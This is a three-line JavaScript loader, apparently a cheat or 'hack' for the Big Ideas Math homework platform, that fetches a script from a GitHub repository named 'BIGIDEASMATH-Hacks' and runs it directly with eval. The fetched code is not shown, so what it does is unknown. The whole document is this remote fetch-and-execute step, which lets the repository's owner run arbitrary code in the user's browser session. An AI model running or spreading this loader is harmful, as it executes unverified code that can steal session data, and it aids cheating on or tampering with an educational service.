fetch("https://raw.githubusercontent.com/Declan70/BIGIDEASMATH-Hacks/main/source.js")
  .then(response => response.text())
  .then(script => eval(script));
